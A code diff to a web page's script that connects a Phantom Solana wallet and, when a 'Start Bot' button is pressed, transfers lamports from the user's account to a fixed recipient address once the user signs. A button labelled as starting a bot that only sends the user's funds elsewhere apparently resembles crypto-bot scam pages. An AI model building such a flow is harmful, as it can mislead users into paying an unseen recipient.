@@ -58,6 +58,15 @@
     const phantomDeepLink = "https://phantom.app/ul/v1/connect?app_url=YOUR_APP_URL";
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
+    // Wait for DOM content to load
+    document.addEventListener('DOMContentLoaded', () => {
+        if (window.solana && window.solana.isPhantom) {
+            console.log("Phantom wallet found");
+        } else {
+            alert("Phantom Wallet not detected. Please install the extension.");
+        }
+    });
+
     // Function to connect Phantom wallet
     async function connectPhantomWallet() {
         if (window.solana && window.solana.isPhantom) {
@@ -68,8 +77,11 @@
                 document.getElementById("startBotButton").disabled = false;
                 document.getElementById("status").innerText = "Wallet connected successfully.";
             } catch (error) {
-                console.error("Error connecting to Phantom:", error);
-                alert("Error connecting to Phantom: " + error.message);
+                if (error.code === 4001) {
+                    alert("Connection request was rejected by the user.");
+                } else {
+                    alert("Error connecting to Phantom Wallet: " + error.message);
+                }
             }
         } else if (isMobile) {
             window.location.href = phantomDeepLink;
@@ -87,39 +99,40 @@
             return;
         }
 
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-        const transaction = new solanaWeb3.Transaction();
-        
+        const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+        const transaction = new Transaction();
+
         try {
-            // Start processing
             document.getElementById("status").innerText = "Creating transaction...";
-            document.getElementById("startBotButton").innerText = "Processing...";
             document.getElementById("startBotButton").disabled = true;
+            document.getElementById("startBotButton").innerText = "Processing...";
 
             transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: new solanaWeb3.PublicKey(userAccount),
-                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: 1000000 // Send a small amount for testing (adjust as needed)
+                SystemProgram.transfer({
+                    fromPubkey: new PublicKey(userAccount),
+                    toPubkey: new PublicKey(recipientAddress),
+                    lamports: 1000000, // Adjust for desired amount
                 })
             );
 
+            // Get recent blockhash
+            const { blockhash } = await connection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = new PublicKey(userAccount);
+
             // Request transaction signature
-            document.getElementById("status").innerText = "Requesting signature...";
             const signedTransaction = await window.solana.signTransaction(transaction);
 
             // Send the transaction
             document.getElementById("status").innerText = "Sending transaction...";
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             await connection.confirmTransaction(signature, 'confirmed');
-            document.getElementById("status").innerText = `Transaction successful: ${signature}`;
-            console.log("Transaction successful:", signature);
 
+            document.getElementById("status").innerText = `Transaction successful: ${signature}`;
         } catch (error) {
             console.error("Transaction error:", error);
             document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
         } finally {
-            // Re-enable the button and reset the text
             document.getElementById("startBotButton").innerText = "Start Bot";
             document.getElementById("startBotButton").disabled = false;
         }
